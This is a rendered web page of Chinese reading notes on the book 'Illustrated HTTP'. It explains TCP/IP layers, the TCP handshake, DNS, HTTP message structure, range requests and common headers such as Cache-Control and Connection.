<template><div><h1 id="图解http" tabindex="-1"><a class="header-anchor" href="#图解http" aria-hidden="true">#</a> 图解HTTP</h1>
<blockquote>
<p>本文是阅读《图解HTTP书籍》记录笔记，有兴趣可购买原版书籍。</p>
</blockquote>
<h2 id="了解-web-及网络基础" tabindex="-1"><a class="header-anchor" href="#了解-web-及网络基础" aria-hidden="true">#</a> 了解 Web 及网络基础</h2>
<h3 id="tcp-ip-的分层管理" tabindex="-1"><a class="header-anchor" href="#tcp-ip-的分层管理" aria-hidden="true">#</a> TCP/IP 的分层管理</h3>
<p>TCP/IP 协议族里重要的一点就是分层。TCP/IP 协议族按层次分别分 为以下 4 层：<strong>应用层、传输层、网络层和数据链路层。</strong>
把 TCP/IP 层次化是有好处的。比如，如果互联网只由一个协议统 筹，某个地方需要改变设计时，就必须把所有部分整体替换掉。而分 层之后只需把变动的层替换掉即可。**把各层之间的接口部分规划好之 后，每个层次内部的设计就能够自由改动了。 **
值得一提的是，层次化之后，设计也变得相对简单了。处于应用层上 的应用可以只考虑分派给自己的任务，而不需要弄清对方在地球上哪 个地方、对方的传输路线是怎样的、是否能确保传输送达等问题。</p>
<p>TCP/IP 协议族各层的作用如下。</p>
<h5 id="应用层" tabindex="-1"><a class="header-anchor" href="#应用层" aria-hidden="true">#</a> 应用层</h5>
<p><strong>应用层决定了向用户提供应用服务时通信的活动。</strong>
TCP/IP 协议族内预存了各类通用的应用服务。比如，FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。<strong>HTTP 协议也处于该层。</strong></p>
<h5 id="传输层" tabindex="-1"><a class="header-anchor" href="#传输层" aria-hidden="true">#</a> 传输层</h5>
<p><strong>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。</strong>
<strong>在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。</strong></p>
<h5 id="网络层-又名网络互连层" tabindex="-1"><a class="header-anchor" href="#网络层-又名网络互连层" aria-hidden="true">#</a> 网络层（又名网络互连层）</h5>
<p><strong>网络层用来处理在网络上流动的数据包</strong>。
数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。
与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。</p>
<h5 id="链路层-又名数据链路层-网络接口层" tabindex="-1"><a class="header-anchor" href="#链路层-又名数据链路层-网络接口层" aria-hidden="true">#</a> 链路层（又名数据链路层，网络接口层）</h5>
<p>**用来处理连接网络的硬件部分。**包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</p>
<h4 id="tcp-ip-通信传输流" tabindex="-1"><a class="header-anchor" href="#tcp-ip-通信传输流" aria-hidden="true">#</a> TCP/IP 通信传输流</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150227500.png" alt="image-20220804150227500"></p>
<p>利用 TCP/IP 协议族进行网络通信时，会通过分层顺序与对方进行通 信。发送端从应用层往下走，接收端则往应用层往上走。<br>
我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。
接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。
在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。
这样一来，发往网络的通信请求就准备齐全了。
接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。
当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP 请求。
<img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150245762.png" alt="image-20220804150245762"></p>
<p>发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。
反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。
这种把数据信息包装起来的做法称为封装（encapsulate）。</p>
<h3 id="与-http-关系密切的协议-ip、tcp-和-dns" tabindex="-1"><a class="header-anchor" href="#与-http-关系密切的协议-ip、tcp-和-dns" aria-hidden="true">#</a> 与 HTTP 关系密切的协议 : IP、TCP 和 DNS</h3>
<h4 id="ip" tabindex="-1"><a class="header-anchor" href="#ip" aria-hidden="true">#</a> IP</h4>
<p>IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方 那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC 地址（Media Access Control Address）。<br>
IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定 地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC 地址基本上不会更改。</p>
<p>ARP 协议</p>
<p>IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网 （LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转 才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address Resolution Protocol）。**ARP 是一种用以解析地址的协议，根据通信方 的 IP 地址就可以反查出对应的 MAC 地址。 **</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150309479.png" alt="image-20220804150309479"></p>
<h4 id="tcp-协议" tabindex="-1"><a class="header-anchor" href="#tcp-协议" aria-hidden="true">#</a> TCP 协议</h4>
<p>按层次分，TCP 位于传输层，提供可靠的字节流服务。
所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大 块数据分割成以报文段（segment）为单位的数据包进行管理。而可 靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之， **TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够 确认数据最终是否送达到对方。 **</p>
<p>为了准确无误地将数据送达目标处，TCP 协议采用了三次握手 （three-way handshaking）策略。用 TCP 协议把数据包送出去后，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。</p>
<p>握手过程中使用了 TCP 的标志（flag） —— <strong>SYN（synchronize） 和 ACK（acknowledgement）</strong>。</p>
<p>**发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后， 回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。 **</p>
<p>若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发 送相同的数据包。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150325875.png" alt="image-20220804150325875"></p>
<p>除了上述三次握手，TCP 协议还有其他各种手段来保证通信的可靠性。</p>
<h3 id="负责域名解析的-dns-服务" tabindex="-1"><a class="header-anchor" href="#负责域名解析的-dns-服务" aria-hidden="true">#</a> 负责域名解析的 DNS 服务</h3>
<p>DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的 协议。它<strong>提供域名到 IP 地址之间的解析服务。</strong>
计算机既可以被赋予 IP 地址，也可以被赋予主机名和域名。比如 <a href="https://www.hackr.jp" target="_blank" rel="noopener noreferrer">www.hackr.jp<ExternalLinkIcon/></a>。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150339898.png" alt="image-20220804150339898"></p>
<h3 id="各种协议与-http-协议的关系" tabindex="-1"><a class="header-anchor" href="#各种协议与-http-协议的关系" aria-hidden="true">#</a> 各种协议与 HTTP 协议的关系</h3>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150359073.png" alt="image-20220804150359073"></p>
<h3 id="uri-和-url" tabindex="-1"><a class="header-anchor" href="#uri-和-url" aria-hidden="true">#</a> URI 和 URL</h3>
<p>与 URI（统一资源标识符）相比，我们更熟悉 URL（Uniform Resource Locator，统一资源定位符）。URL 正是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址。</p>
<h4 id="统一资源标识符" tabindex="-1"><a class="header-anchor" href="#统一资源标识符" aria-hidden="true">#</a> 统一资源标识符</h4>
<p>URI 就是由某个协议方案表示的资源的定位标识符。协议 方案是指访问资源所使用的协议类型名称。</p>
<p>URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联网上所处的位置）。可见 URL 是 URI 的子集。</p>
<h2 id="简单的-http-协议" tabindex="-1"><a class="header-anchor" href="#简单的-http-协议" aria-hidden="true">#</a> 简单的 HTTP 协议</h2>
<h3 id="请求报文" tabindex="-1"><a class="header-anchor" href="#请求报文" aria-hidden="true">#</a> 请求报文</h3>
<p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段 和内容实体构成的。<br>
<img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150426961.png" alt="image-20220804150426961"></p>
<h3 id="响应报文" tabindex="-1"><a class="header-anchor" href="#响应报文" aria-hidden="true">#</a> 响应报文</h3>
<p>响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代 码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主 体构成。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150441612.png" alt="image-20220804150441612"></p>
<h3 id="http-是不保存状态的协议" tabindex="-1"><a class="header-anchor" href="#http-是不保存状态的协议" aria-hidden="true">#</a> HTTP 是不保存状态的协议</h3>
<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个 级别，协议对于发送过的请求或响应都不做持久化处理。<br>
<img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150534050.png" alt="image-20220804150534050"></p>
<h3 id="告知服务器意图的-http-方法" tabindex="-1"><a class="header-anchor" href="#告知服务器意图的-http-方法" aria-hidden="true">#</a> 告知服务器意图的 HTTP 方法</h3>
<ol>
<li>GET ：获取资源</li>
<li>POST：传输实体主体</li>
<li>PUT：传输文件</li>
<li>HEAD：获得报文首部</li>
<li>DELETE：删除文件</li>
<li>OPTIONS：询问支持的方法</li>
<li>TRACE：追踪路径</li>
<li>CONNECT：要求用隧道协议连接代理</li>
</ol>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150544137.png" alt="image-20220804150544137"></p>
<h3 id="持久连接" tabindex="-1"><a class="header-anchor" href="#持久连接" aria-hidden="true">#</a> 持久连接</h3>
<p>HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接。</p>
<h4 id="持久连接-1" tabindex="-1"><a class="header-anchor" href="#持久连接-1" aria-hidden="true">#</a> 持久连接</h4>
<p>为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了 持久连接（HTTP Persistent Connections，也称为 HTTP keep-alive 或 HTTP connection reuse）的方法。**持久连接的特点是，只要任意一端 没有明确提出断开连接，则保持 TCP 连接状态。 **
在 HTTP/1.1 中，所有的连接默认都是持久连接，但在 HTTP/1.0 内并 未标准化。虽然有一部分服务器通过非标准的手段实现了持久连接， 但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客 户端也需要支持持久连接。</p>
<h4 id="管线化" tabindex="-1"><a class="header-anchor" href="#管线化" aria-hidden="true">#</a> 管线化</h4>
<p>持久连接使得多数请求以管线化（pipelining）方式发送成为可能。从 前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术 出现后，不用等待响应亦可直接发送下一个请求。
这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待 响应了。<br>
<img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150558365.png" alt="image-20220804150558365"></p>
<h2 id="http-报文内的-http-信息" tabindex="-1"><a class="header-anchor" href="#http-报文内的-http-信息" aria-hidden="true">#</a> HTTP 报文内的 HTTP 信息</h2>
<h3 id="http-报文" tabindex="-1"><a class="header-anchor" href="#http-报文" aria-hidden="true">#</a> HTTP 报文</h3>
<p>用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的 HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。 HTTP 报文本身是由多行（用<code v-pre> CR+LF</code> 作换行符）数据构成的字符串文 本。 HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的 空行（<code v-pre>CR+LF</code>）来划分。通常，并不一定要有报文主体。</p>
<h3 id="请求报文及响应报文的结构" tabindex="-1"><a class="header-anchor" href="#请求报文及响应报文的结构" aria-hidden="true">#</a> 请求报文及响应报文的结构</h3>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150609948.png" alt="image-20220804150609948"></p>
<p>图：请求报文（上）和响应报文（下）的结构</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150619767.png" alt="image-20220804150619767"></p>
<p>请求报文和响应报文的首部内容由以下数据组成。现在出现的各种首 部字段及状态码稍后会进行阐述。</p>
<ul>
<li>请求行： 包含用于请求的方法，请求 URI 和 HTTP 版本。</li>
<li>状态行： 包含表明响应结果的状态码，原因短语和 HTTP 版本。</li>
<li>首部字段： 包含表示请求和响应的各种条件和属性的各类首部。</li>
<li>一般有 4 种首部，分别是：通用首部、请求首部、响应首部和实体首部。</li>
<li>其他： 可能包含 HTTP 的 RFC 里未定义的首部（Cookie 等）。</li>
</ul>
<h4 id="压缩传输的内容编码" tabindex="-1"><a class="header-anchor" href="#压缩传输的内容编码" aria-hidden="true">#</a> 压缩传输的内容编码</h4>
<p>向待发送邮件内增加附件时，为了使邮件容量变小，我们会先用 ZIP压缩文件之后再添加附件发送。HTTP 协议中有一种被称为内容编码
的功能也能进行类似的操作。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150632609.png" alt="image-20220804150632609"></p>
<p>常用的内容编码有以下几种。</p>
<ul>
<li>gzip（GNU zip）</li>
<li>compress（UNIX 系统的标准压缩）</li>
<li>deflate（zlib）</li>
<li>identity（不进行编码）</li>
</ul>
<h4 id="分割发送的分块传输编码" tabindex="-1"><a class="header-anchor" href="#分割发送的分块传输编码" aria-hidden="true">#</a> 分割发送的分块传输编码</h4>
<p>在 HTTP 通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成
多块，能够让浏览器逐步显示页面。</p>
<p>这种把实体主体分块的功能称为分块传输编码（Chunked TransferCoding）。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150734653.png" alt="image-20220804150734653"></p>
<p>分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用“0(<code v-pre>CR+LF</code>)”来标
记。</p>
<p>使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编码前的实体主体。</p>
<p>HTTP/1.1 中存在一种称为传输编码（Transfer Coding）的机制，它可以在通信时按某种编码方式传输，但只定义作用于分块传输编码中。</p>
<h4 id="发送多种数据的多部分对象集合" tabindex="-1"><a class="header-anchor" href="#发送多种数据的多部分对象集合" aria-hidden="true">#</a> 发送多种数据的多部分对象集合</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150744918.png" alt="image-20220804150744918"></p>
<p>HTTP 协议中也采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。</p>
<ul>
<li>
<p>multipart/form-data</p>
<p>在 Web 表单文件上传时使用。</p>
</li>
<li>
<p>multipart/byteranges</p>
<p>状态码 206（Partial Content，部分内容）响应报文包含了多个范
围的内容时使用。</p>
</li>
<li>
<p>multipart/form-data</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150804338.png" alt="image-20220804150804338"></p>
</li>
<li>
<p>multipart/byteranges</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150828212.png" alt="image-20220804150828212"></p>
</li>
</ul>
<p>在 HTTP 报文中使用多部分对象集合时，需要在首部字段里加上 ** Content-type** 。</p>
<h3 id="获取部分内容的范围请求" tabindex="-1"><a class="header-anchor" href="#获取部分内容的范围请求" aria-hidden="true">#</a> 获取部分内容的范围请求</h3>
<p>以前，用户不能使用现在这种高速的带宽访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络
中断的情况，那就必须重头开始。为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。</p>
<p>要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求（Range Request）。</p>
<p>对一份 10 000 字节大小的资源，如果使用范围请求，可以只请求
5001~10 000 字节内的资源。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150852590.png" alt="image-20220804150852590"></p>
<p>执行范围请求时，会用到首部字段 Range 来指定资源的 byte 范围。byte 范围的指定形式如下。</p>
<ul>
<li>
<p>5001~10 000 字节</p>
<p><code v-pre>Range: bytes=5001-10000</code></p>
</li>
<li>
<p>从 5001 字节之后全部的</p>
<p><code v-pre>Range: bytes=5001-</code></p>
</li>
<li>
<p>从一开始到 3000 字节和 5000~7000 字节的多重范围</p>
<p><code v-pre>Range: bytes=-3000, 5000-7000</code></p>
</li>
</ul>
<p>针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 ContentType 标明 multipart/byteranges 后返回响应报文。</p>
<p>如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。</p>
<h2 id="http-首部" tabindex="-1"><a class="header-anchor" href="#http-首部" aria-hidden="true">#</a> HTTP 首部</h2>
<h3 id="http-首部字段" tabindex="-1"><a class="header-anchor" href="#http-首部字段" aria-hidden="true">#</a> HTTP 首部字段</h3>
<h4 id="http-首部字段传递重要信息" tabindex="-1"><a class="header-anchor" href="#http-首部字段传递重要信息" aria-hidden="true">#</a> HTTP 首部字段传递重要信息</h4>
<p>使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150905204.png" alt="image-20220804150905204"></p>
<h3 id="http-1-1-通用首部字段" tabindex="-1"><a class="header-anchor" href="#http-1-1-通用首部字段" aria-hidden="true">#</a> HTTP/1.1 通用首部字段</h3>
<h4 id="cache-control" tabindex="-1"><a class="header-anchor" href="#cache-control" aria-hidden="true">#</a> Cache-Control</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150915316.png" alt="image-20220804150915316"></p>
<p><code v-pre>Cache-Control: private, max-age=0, no-cache</code></p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150923509.png" alt="image-20220804150923509"></p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150932313.png" alt="image-20220804150932313"></p>
<h5 id="no-cache-指令" tabindex="-1"><a class="header-anchor" href="#no-cache-指令" aria-hidden="true">#</a> no-cache 指令</h5>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804150943573.png" alt="image-20220804150943573"></p>
<p><code v-pre>Cache-Control: no-cache</code></p>
<p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。</p>
<p>客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。</p>
<p>如果服务器返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。</p>
<p><code v-pre>Cache-Control: no-cache=Location</code></p>
<p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p>
<h5 id="控制可执行缓存的对象的指令" tabindex="-1"><a class="header-anchor" href="#控制可执行缓存的对象的指令" aria-hidden="true">#</a> 控制可执行缓存的对象的指令</h5>
<p>no-store 指令</p>
<p><code v-pre>Cache-Control: no-store</code></p>
<p>当使用 no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。</p>
<p>从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请读者注意区别理解。</p>
<p>因此，该指令规定缓存不能在本地存储请求或响应的任一部分。</p>
<h5 id="指定缓存期限和认证的指令" tabindex="-1"><a class="header-anchor" href="#指定缓存期限和认证的指令" aria-hidden="true">#</a> 指定缓存期限和认证的指令</h5>
<p>s-maxage 指令</p>
<p><code v-pre>Cache-Control: s-maxage=604800（单位 ：秒）</code></p>
<p>s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多位用户使用的公共缓存服务器(代理服务器)。也就是
说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。</p>
<p>另外，当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及 max-age 指令的处理。</p>
<h4 id="max-age-指令" tabindex="-1"><a class="header-anchor" href="#max-age-指令" aria-hidden="true">#</a> max-age 指令</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151000062.png" alt="image-20220804151000062"></p>
<p><code v-pre>Cache-Control: max-age=604800（单位：秒）</code></p>
<p>当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。</p>
<p>当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。</p>
<p>应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p>
<h5 id="min-fresh-指令" tabindex="-1"><a class="header-anchor" href="#min-fresh-指令" aria-hidden="true">#</a> min-fresh 指令</h5>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151010692.png" alt="image-20220804151010692"></p>
<p><code v-pre>Cache-Control: min-fresh=60（单位：秒）</code></p>
<p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p>
<p>比如，当指定 min-fresh 为 60 秒后，过了 60 秒的资源都无法作为响应返回了。</p>
<h5 id="max-stale-指令" tabindex="-1"><a class="header-anchor" href="#max-stale-指令" aria-hidden="true">#</a> max-stale 指令</h5>
<p><code v-pre>Cache-Control: max-stale=3600（单位：秒）</code></p>
<p>使用 max-stale 可指示缓存资源，即使过期也照常接收。
如果指令未指定参数值，那么无论经过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale指定的时间内，仍旧会被客户端接收。</p>
<h5 id="only-if-cached-指令" tabindex="-1"><a class="header-anchor" href="#only-if-cached-指令" aria-hidden="true">#</a> only-if-cached 指令</h5>
<p><code v-pre>Cache-Control: only-if-cached</code></p>
<p>使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。</p>
<h5 id="must-revalidate-指令" tabindex="-1"><a class="header-anchor" href="#must-revalidate-指令" aria-hidden="true">#</a> must-revalidate 指令</h5>
<p><code v-pre>Cache-Control: must-revalidate</code></p>
<p>使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。</p>
<p>若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。</p>
<p>另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。</p>
<h5 id="proxy-revalidate-指令" tabindex="-1"><a class="header-anchor" href="#proxy-revalidate-指令" aria-hidden="true">#</a> proxy-revalidate 指令</h5>
<p><code v-pre>Cache-Control: proxy-revalidate</code></p>
<p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</p>
<h5 id="no-transform-指令" tabindex="-1"><a class="header-anchor" href="#no-transform-指令" aria-hidden="true">#</a> no-transform 指令</h5>
<p><code v-pre>Cache-Control: no-transform</code></p>
<p>使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。</p>
<p>这样做可防止缓存或代理压缩图片等类似操作。</p>
<h4 id="cache-control-扩展" tabindex="-1"><a class="header-anchor" href="#cache-control-扩展" aria-hidden="true">#</a> Cache-Control 扩展</h4>
<h5 id="cache-extension-token" tabindex="-1"><a class="header-anchor" href="#cache-extension-token" aria-hidden="true">#</a> cache-extension token</h5>
<p><code v-pre>Cache-Control: private, community=&quot;UCI&quot;</code></p>
<p>通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。</p>
<p>如上例，Cache-Control 首部字段本身没有 community 这个指令。借助 extension tokens 实现了该指令的添加。如果缓存服务器不能理解 community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。</p>
<h4 id="connection" tabindex="-1"><a class="header-anchor" href="#connection" aria-hidden="true">#</a> Connection</h4>
<p>Connection 首部字段具备如下两个作用。</p>
<ul>
<li>控制不再转发给代理的首部字段</li>
<li>管理持久连接</li>
<li>控制不再转发给代理的首部字段</li>
</ul>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151031179.png" alt="image-20220804151031179"></p>
<p>在客户端发送请求和服务器返回响应内，使用 Connection 首部字段，可控制不再转发给代理的首部字段（即 Hop-by-hop 首部）。</p>
<ul>
<li>管理持久连接</li>
</ul>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151040449.png" alt="image-20220804151040449"></p>
<p><code v-pre>Connection: close</code></p>
<p>HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定 Connection 首部字段的值为 Close。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151050243.png" alt="image-20220804151050243"></p>
<p><code v-pre>Connection: Keep-Alive</code></p>
<p>HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。</p>
<p>如上图①所示，客户端发送请求给服务器时，服务器端会像上图②那样加上首部字段 Keep-Alive 及首部字段 Connection 后返回响应。</p>
<h4 id="date" tabindex="-1"><a class="header-anchor" href="#date" aria-hidden="true">#</a> Date</h4>
<p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p>
<p>HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式，如下 示例。</p>
<p><code v-pre>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></p>
<p>之前的 HTTP 协议版本中使用在 RFC850 中定义的格式，如下所示。</p>
<p><code v-pre>Date: Tue, 03-Jul-12 04:40:59 GMT</code></p>
<p>除此之外，还有一种格式。它与 C 标准库内的 asctime() 函数的输出格式一致。</p>
<p><code v-pre>Date: Tue Jul 03 04:40:59 2012</code></p>
<h4 id="pragma" tabindex="-1"><a class="header-anchor" href="#pragma" aria-hidden="true">#</a> Pragma</h4>
<p>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。</p>
<p>规范定义的形式唯一，如下所示。</p>
<p><code v-pre>Pragma: no-cache</code></p>
<p>该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151104910.png" alt="image-20220804151104910"></p>
<p>所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 CacheControl: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握
全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Cache-Control: no-cache
Pragma: no-cache
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="trailer" tabindex="-1"><a class="header-anchor" href="#trailer" aria-hidden="true">#</a> Trailer</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151115077.png" alt="image-20220804151115077"></p>
<p>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151123452.png" alt="image-20220804151123452"></p>
<h4 id="transfer-encoding" tabindex="-1"><a class="header-anchor" href="#transfer-encoding" aria-hidden="true">#</a> Transfer-Encoding</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151132300.png" alt="image-20220804151132300"></p>
<p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。</p>
<p>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151223650.png" alt="image-20220804151223650"></p>
